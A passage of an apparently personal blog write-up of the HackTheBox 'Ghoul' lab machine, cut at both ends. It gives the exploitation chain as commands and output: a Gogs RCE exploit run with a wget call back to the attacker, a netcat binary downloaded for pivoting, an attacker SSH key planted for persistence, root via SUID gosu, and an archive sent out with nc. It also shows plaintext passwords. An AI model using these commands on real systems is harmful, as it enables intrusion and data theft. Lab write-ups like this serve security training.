<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kaneki_pub@kaneki-pc:&#x2F;tmp$ wget http:&#x2F;&#x2F;172.20.0.10:8888&#x2F;nc</span><br><span class="line">--2019-10-04 13:37:59--  http:&#x2F;&#x2F;172.20.0.10:8888&#x2F;nc</span><br><span class="line">Connecting to 172.20.0.10:8888... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 959800 (937K) [application&#x2F;octet-stream]</span><br><span class="line">Saving to: ‘nc’</span><br><span class="line">nc                                                   100%[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;] 937.30K  --.-KB&#x2F;s    in 0.006s </span><br><span class="line">2019-10-04 13:37:59 (161 MB&#x2F;s) - ‘nc’ saved [959800&#x2F;959800]</span><br><span class="line">kaneki_pub@kaneki-pc:&#x2F;tmp$</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kaneki_pub@kaneki-pc:&#x2F;tmp$ .&#x2F;nc -zv 172.18.0.2 1-10000</span><br><span class="line">cuff_web_1.cuff_default [172.18.0.2] 22 (ssh) open</span><br><span class="line">cuff_web_1.cuff_default [172.18.0.2] 3000 open</span><br><span class="line">kaneki_pub@kaneki-pc:&#x2F;tmp$</span><br></pre></td></tr></table></figure>
<p>Port 3000 is the default port for <code>gogs</code>, I forwarded it to <code>Aogori</code> then from <code>Aogiri</code> to my machine :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Aogiri:~# ssh -L 3000:172.18.0.2:3000 -i &#x2F;home&#x2F;kaneki&#x2F;.ssh&#x2F;id_rsa kaneki_pub@172.20.0.150                                                                                                                     </span><br><span class="line">Enter passphrase for key &#39;&#x2F;home&#x2F;kaneki&#x2F;.ssh&#x2F;id_rsa&#39;: </span><br><span class="line">Last login: Fri Oct  4 13:38:45 2019 from 172.20.0.10</span><br><span class="line">kaneki_pub@kaneki-pc:~$</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# ssh -L 3000:127.0.0.1:3000 -i kaneki.key kaneki@ghoul.htb </span><br><span class="line">Enter passphrase for key &#39;kaneki.key&#39;: </span><br><span class="line">Last login: Fri Oct  4 13:42:14 2019 from 10.10.15.168</span><br><span class="line">kaneki@Aogiri:~$</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/ghoul/19.png" alt=""><br>We already have the username : <code>AogiriTest</code>. I tried the password I got from <code>tomcat-users.xml</code> (<code>test@aogiri123</code>) and it worked :<br><img src="/images/hackthebox/ghoul/20.png" alt=""><br><img src="/images/hackthebox/ghoul/21.png" alt=""><br>The hint said that this version of <code>gogs</code> was vulnerable, so I cloned <a href="https://github.com/TheZ3ro/gogsownz" target="_blank" rel="noopener">gogsownz</a> and tried to exploit the <code>RCE</code> vulnerability :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# git clone https:&#x2F;&#x2F;github.com&#x2F;TheZ3ro&#x2F;gogsownz.git</span><br><span class="line">Cloning into &#39;gogsownz&#39;...</span><br><span class="line">remote: Enumerating objects: 11, done.</span><br><span class="line">remote: Counting objects: 100% (11&#x2F;11), done.</span><br><span class="line">remote: Compressing objects: 100% (11&#x2F;11), done.</span><br><span class="line">remote: Total 11 (delta 2), reused 5 (delta 0), pack-reused 0</span><br><span class="line">Unpacking objects: 100% (11&#x2F;11), done.</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul#</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul&#x2F;gogsownz# python3 gogsownz.py -v  http:&#x2F;&#x2F;127.0.0.1:3000&#x2F; -C &#39;AogiriTest&#39;:&#39;test@aogiri123&#39; -n i_like_gogits --rce &#39;wget http:&#x2F;&#x2F;10.10.xx.xx&#39; --cleanup</span><br><span class="line">[i] Starting Gogsownz on: http:&#x2F;&#x2F;127.0.0.1:3000</span><br><span class="line">[+] Loading Gogs homepage</span><br><span class="line">[i] Gogs Version installed: © 2018 Gogs Version: 0.11.66.0916 </span><br><span class="line">[i] The Server is redirecting on the login page. Probably REQUIRE_SIGNIN_VIEW is enabled so you will need an account.</span><br><span class="line">[+] Performing login</span><br><span class="line">[+] Logged in sucessfully as AogiriTest</span><br><span class="line">[+] Got UserID 2</span><br><span class="line">[+] Repository created sucessfully</span><br><span class="line">[i] Exploiting authenticated PrivEsc...</span><br><span class="line">[+] Uploading admin session as repository file</span><br><span class="line">[+] Uploaded successfully.</span><br><span class="line">[+] Committing the Admin session</span><br><span class="line">[+] Committed sucessfully</span><br><span class="line">[+] Removing Repo evidences</span><br><span class="line">[+] Repo removed sucessfully</span><br><span class="line">[i] Signed in as kaneki, is admin True</span><br><span class="line">[i] Current session cookie: &#39;638cb471cd001337&#39;</span><br><span class="line">[+] Got UserID 1</span><br><span class="line">[+] Repository created sucessfully</span><br><span class="line">[+] Setting Git hooks</span><br><span class="line">[+] Git hooks set sucessfully</span><br><span class="line">[+] Fetching last commit...</span><br><span class="line">[+] Got last commit</span><br><span class="line">[+] Triggering the RCE with a new commit</span><br><span class="line">[+] Committed sucessfully</span><br><span class="line">[i] Performed RCE successfully</span><br><span class="line">[i] Waiting 10 seconds before cleaning up...</span><br><span class="line">[+] Removing Repo evidences</span><br><span class="line">[+] Repo removed sucessfully</span><br><span class="line">[i] Done!</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul&#x2F;gogsownz#</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# python -m SimpleHTTPServer 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">10.10.10.101 - - [04&#x2F;Oct&#x2F;2019 16:41:19] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -</span><br></pre></td></tr></table></figure>
<p>It worked, time to get a reverse shell :<br><img src="/images/hackthebox/ghoul/22.png" alt=""></p>
<h2 id="Privilege-Escalation-from-git-to-root-Getting-aogiri-app-7z"><a href="#Privilege-Escalation-from-git-to-root-Getting-aogiri-app-7z" class="headerlink" title="Privilege Escalation from git to root, Getting aogiri-app.7z"></a>Privilege Escalation from git to root, Getting aogiri-app.7z</h2><p>Unfortunately python wasn’t installed on the host so I had to get <code>ssh</code> for a better shell.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;home</span><br><span class="line">ls -la</span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Oct  4 14:45 .</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Dec 13  2018 ..</span><br><span class="line">lrwxrwxrwx    1 root     root             9 Oct  4 14:45 git -&gt; &#x2F;data&#x2F;git</span><br><span class="line">cd git</span><br><span class="line">ls -la</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x    4 git      git           4096 Oct  4 14:45 .</span><br><span class="line">drwxr-xr-x    5 git      git           4096 Dec 13  2018 ..</span><br><span class="line">lrwxrwxrwx    1 git      git              9 Dec 29  2018 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r--r--    1 git      git             71 Oct  4 14:45 .gitconfig</span><br><span class="line">drwx------    2 git      git           4096 Dec 13  2018 .ssh</span><br><span class="line">drwxr-xr-x    4 git      git           4096 Dec 13  2018 gogs-repositories</span><br><span class="line">cd .ssh</span><br><span class="line">ls -la</span><br><span class="line">total 12</span><br><span class="line">drwx------    2 git      git           4096 Dec 13  2018 .</span><br><span class="line">drwxr-xr-x    4 git      git           4096 Oct  4 14:45 ..</span><br><span class="line">-rw-------    1 git      git             23 Dec 13  2018 environment</span><br><span class="line">echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsiPbWC8feNW7o6emQUk12tFOcucqoS&#x2F;nnKN&#x2F;LM3hCtPN8r4by8Ml1IR5DctjeurAmlJtXcn8MqlHCRbR6hZKydDwDzH3mb6M&#x2F;gCYm4fD9FppbOdG4xMVGODbTTPV&#x2F;h2Lh3ITRm+xNHYDmWG84rQe++gJImKoREkzsUNqSvQv4rO1RlO6W3rnz1ySPAjZF5sloJ8Rmnk+MK4skfj00Gb2mM0&#x2F;RNmLC&#x2F;rhwoUC+Wh0KPkuErg4YlqD8IB7L3N&#x2F;UaaPjSPrs2EDeTGTTFI9GdcT6LIaS65CkcexWlboQu3DDOM5lfHghHHbGOWX+bh8VHU9JjvfC8hDN74IvBsy120N5 kaneki@kaneki-pc&quot; &gt; authorized_keys</span><br><span class="line">ls -la</span><br><span class="line">total 16</span><br><span class="line">drwx------    2 git      git           4096 Oct  4 14:52 .</span><br><span class="line">drwxr-xr-x    4 git      git           4096 Oct  4 14:45 ..</span><br><span class="line">-rw-r--r--    1 git      git            398 Oct  4 14:52 authorized_keys</span><br><span class="line">-rw-------    1 git      git             23 Dec 13  2018 environment</span><br><span class="line">cat authorized_keys</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsiPbWC8feNW7o6emQUk12tFOcucqoS&#x2F;nnKN&#x2F;LM3hCtPN8r4by8Ml1IR5DctjeurAmlJtXcn8MqlHCRbR6hZKydDwDzH3mb6M&#x2F;gCYm4fD9FppbOdG4xMVGODbTTPV&#x2F;h2Lh3ITRm+xNHYDmWG84rQe++gJImKoREkzsUNqSvQv4rO1RlO6W3rnz1ySPAjZF5sloJ8Rmnk+MK4skfj00Gb2mM0&#x2F;RNmLC&#x2F;rhwoUC+Wh0KPkuErg4YlqD8IB7L3N&#x2F;UaaPjSPrs2EDeTGTTFI9GdcT6LIaS65CkcexWlboQu3DDOM5lfHghHHbGOWX+bh8VHU9JjvfC8hDN74IvBsy120N5 kaneki@kaneki-pc</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kaneki_pub@kaneki-pc:~$ ssh -i .ssh&#x2F;id_rsa git@172.18.0.2</span><br><span class="line">Enter passphrase for key &#39;.ssh&#x2F;id_rsa&#39;: </span><br><span class="line">Welcome to Alpine!</span><br><span class="line"></span><br><span class="line">The Alpine Wiki contains a large amount of how-to guides and general</span><br><span class="line">information about administrating Alpine systems.</span><br><span class="line">See &lt;http:&#x2F;&#x2F;wiki.alpinelinux.org&gt;.</span><br><span class="line"></span><br><span class="line">You can setup the system with the command: setup-alpine</span><br><span class="line"></span><br><span class="line">You may change this message by editing &#x2F;etc&#x2F;motd.</span><br><span class="line"></span><br><span class="line">3713ea5e4353:~$</span><br></pre></td></tr></table></figure>
<p>I couldn’t find anything useful so I had to escalate to root. After some regular enumeration I checked the <code>suid</code> binaries :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">3713ea5e4353:~$ find &#x2F; -perm -4000 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chage</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;expiry</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;gosu</span><br><span class="line">&#x2F;bin&#x2F;su</span><br><span class="line">3713ea5e4353:~$</span><br></pre></td></tr></table></figure>
<p><code>gosu</code> was interesting so I checked it and found that it executes commands as other users even root, so I executed bash as root :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">3713ea5e4353:~$ gosu </span><br><span class="line">Usage: gosu user-spec command [args]</span><br><span class="line">   ie: gosu tianon bash</span><br><span class="line">       gosu nobody:root bash -c &#39;whoami &amp;&amp; id&#39;</span><br><span class="line">       gosu 1000:1 id</span><br><span class="line"></span><br><span class="line">gosu version: 1.10 (go1.7.1 on linux&#x2F;amd64; gc)</span><br><span class="line">     license: GPL-3 (full text at https:&#x2F;&#x2F;github.com&#x2F;tianon&#x2F;gosu)</span><br><span class="line"></span><br><span class="line">3713ea5e4353:~$ gosu root bash</span><br><span class="line">3713ea5e4353:&#x2F;data&#x2F;git# whoami</span><br><span class="line">root</span><br><span class="line">3713ea5e4353:&#x2F;data&#x2F;git#</span><br></pre></td></tr></table></figure>
<p>I checked the root directory and found a bash script called <code>session.sh</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">3713ea5e4353:~# ls -la</span><br><span class="line">total 128</span><br><span class="line">drwx------    1 root     root          4096 Dec 29  2018 .</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Dec 13  2018 ..</span><br><span class="line">lrwxrwxrwx    1 root     root             9 Dec 29  2018 .ash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">lrwxrwxrwx    1 root     root             9 Dec 29  2018 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r--r--    1 root     root        117507 Dec 29  2018 aogiri-app.7z</span><br><span class="line">-rwxr-xr-x    1 root     root           179 Dec 16  2018 session.sh</span><br><span class="line">3713ea5e4353:~#</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  sleep 300</span><br><span class="line">  rm -rf /data/gogs/data/sessions</span><br><span class="line">  sleep 2</span><br><span class="line">  curl -d <span class="string">'user_name=kaneki&amp;password=12345ILoveTouka!!!'</span> http://172.18.0.2:3000/user/login</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>This script was executed periodically to terminate the active sessions,  I saved the password because we may need it later.<br>The other thing was a <code>7z</code> archive called <code>aogiri-app.7z</code>, I used <code>nc</code> to download it on my box :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3713ea5e4353:~# nc -w 3 10.10.xx.xx 1338 &lt; aogiri-app.7z</span><br><span class="line">3713ea5e4353:~# md5sum aogiri-app.7z </span><br><span class="line">88e134a69f8c2f96de31581a52895c07  aogiri-app.7z</span><br><span class="line">3713ea5e4353:~#</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# nc -lp 1338 &gt; aogiri-app.7z</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# md5sum aogiri-app.7z</span><br><span class="line">88e134a69f8c2f96de31581a52895c07  aogiri-app.7z</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul#</span><br></pre></td></tr></table></figure>


<h2 id="Searching-Through-git-Commits-Privilege-Escalation-on-kaneki-pc"><a href="#Searching-Through-git-Commits-Privilege-Escalation-on-kaneki-pc" class="headerlink" title="Searching Through git Commits, Privilege Escalation on kaneki-pc"></a>Searching Through git Commits, Privilege Escalation on kaneki-pc</h2><p>I created a directory and called it <code>aogiri-app</code> then I extracted the archive there :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# mkdir aogiri-app</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# cd aogiri-app&#x2F;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul&#x2F;aogiri-app# cp ..&#x2F;aogiri-app.7z .</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul&#x2F;aogiri-app# 7za x .&#x2F;aogiri-app.7z </span><br><span class="line"></span><br><span class="line">7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21</span><br><span class="line">p7zip Version 16.02 (locale&#x3D;en_US.UTF-8,Utf16&#x3D;on,HugeFiles&#x3D;on)</span><br><span class="line"></span><br><span class="line">Scanning the drive for archives:</span><br><span class="line">1 file, 117507 bytes (115 KiB)</span><br><span class="line"></span><br><span class="line">Extracting archive: .&#x2F;aogiri-app.7z</span><br><span class="line">--</span><br><span class="line">Path &#x3D; .&#x2F;aogiri-app.7z</span><br><span class="line">Type &#x3D; 7z</span><br><span class="line">Physical Size &#x3D; 117507</span><br><span class="line">Headers Size &#x3D; 4011</span><br><span class="line">Method &#x3D; LZMA2:192k</span><br><span class="line">Solid &#x3D; +</span><br><span class="line">Blocks &#x3D; 1</span><br><span class="line"></span><br><span class="line">Everything is Ok</span><br><span class="line"></span><br><span class="line">Folders: 114</span><br><span class="line">Files: 125</span><br><span class="line">Size:       154976</span><br><span class="line">Compressed: 117507</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul&#x2F;aogiri-app# ls -la</span><br><span class="line">total 128</span><br><span class="line">drwxr-xr-x 3 root root   4096 Oct  4 17:00 .</span><br><span class="line">drwxr-xr-x 4 root root   4096 Oct  4 16:59 ..</span><br><span class="line">-rw-r--r-- 1 root root 117507 Oct  4 17:00 aogiri-app.7z</span><br><span class="line">drwxr-xr-x 5 root root   4096 Dec 29  2018 aogiri-chatapp</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul&#x2F;aogiri-app#</span><br></pre></td></tr></table></figure>
<p>By looking at the extracted files we’ll see that it’s a git repository :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul&#x2F;aogiri-app&#x2F;aogiri-chatapp# ls -la</span><br><span class="line">total 52</span><br><span class="line">drwxr-xr-x 5 root root 4096 Dec 29  2018 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 Oct  4 17:00 ..</span><br><span class="line">drwxr-xr-x 8 root root 4096 Dec 29  2018 .git</span><br><span class="line">-rw-r--r-- 1 root root  268 Dec 29  2018 .gitignore</span><br><span class="line">drwxr-xr-x 3 root root 4096 Dec 29  2018 .mvn</span><br><span class="line">-rwxr-xr-x 1 root root 9113 Dec 29  2018 mvnw</span><br><span class="line">-rw-r--r-- 1 root root 5810 Dec 29  2018 mvnw.cmd</span><br><span class="line">-rw-r--r-- 1 root root 2111 Dec 29  2018 pom.xml</span><br><span class="line">-rw-r--r-- 1 root root  124 Dec 29  2018 README.md</span><br><span class="line">drwxr-xr-x 4 root root 4096 Dec 29  2018 src</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul&#x2F;aogiri-app&#x2F;aogiri-chatapp#</span><br></pre></td></tr></table></figure>
<p>And honestly this was a very big rabbit hole, I kept searching through the application code (it was useless and I couldn’t get anything from it) for a long time while it was actually about the <code>git</code> repository itself.<br>Let’s check the <code>reflog</code> to get the commits :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul&#x2F;aogiri-app&#x2F;aogiri-chatapp# git reflog</span><br><span class="line">647c5f1 (HEAD -&gt; master, origin&#x2F;master) HEAD@&#123;0&#125;: commit: changed service               </span><br><span class="line">b43757d HEAD@&#123;1&#125;: commit: added mysql deps       </span><br><span class="line">b3752e0 HEAD@&#123;2&#125;: reset: moving to b3752e0                                         </span><br><span class="line">0d426b5 HEAD@&#123;3&#125;: reset: moving to 0d426b5                                           </span><br><span class="line">e29ad43 HEAD@&#123;4&#125;: reset: moving to HEAD^                                          </span><br><span class="line">0d426b5 HEAD@&#123;5&#125;: reset: moving to HEAD                                 </span><br><span class="line">0d426b5 HEAD@&#123;6&#125;: reset: moving to origin&#x2F;master                                        </span><br><span class="line">0d426b5 HEAD@&#123;7&#125;: commit: update dependencies                                          </span><br><span class="line">e29ad43 HEAD@&#123;8&#125;: commit: added service                          </span><br><span class="line">b3752e0 HEAD@&#123;9&#125;: commit: noro stop doing stupid shit</span><br><span class="line">813e0a5 HEAD@&#123;10&#125;: commit: hello world!                              </span><br><span class="line">ed5a88c HEAD@&#123;11&#125;: commit: mysql support                                               </span><br><span class="line">51d2c36 HEAD@&#123;12&#125;: commit: added readme                                    </span><br><span class="line">bec96aa HEAD@&#123;13&#125;: commit: updated dependencies                                        </span><br><span class="line">8b74520 HEAD@&#123;14&#125;: commit (initial): update readme</span><br></pre></td></tr></table></figure>
<p>I checked each commit and in one of the commits (<code>0d426b5</code>) I found some passwords :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul&#x2F;aogiri-app&#x2F;aogiri-chatapp# git show 0d426b5</span><br><span class="line">commit 0d426b533d4f1877f8a114620be8a1294f34ab71</span><br><span class="line">Author: kaneki &lt;kaneki@aogiri.htb&gt;</span><br><span class="line">Date:   Sat Dec 29 11:44:50 2018 +0530</span><br><span class="line"></span><br><span class="line">    update dependencies</span><br><span class="line"></span><br><span class="line">diff --git a&#x2F;pom.xml b&#x2F;pom.xml</span><br><span class="line">index 92f24ee..fc1d313 100644</span><br><span class="line">--- a&#x2F;pom.xml</span><br><span class="line">+++ b&#x2F;pom.xml</span><br><span class="line">@@ -48,6 +48,11 @@</span><br><span class="line">             		&lt;artifactId&gt;javax.json&lt;&#x2F;artifactId&gt;</span><br><span class="line">             		&lt;version&gt;1.0&lt;&#x2F;version&gt;</span><br><span class="line"> 		&lt;&#x2F;dependency&gt;</span><br><span class="line">+		&lt;dependency&gt;</span><br><span class="line">+          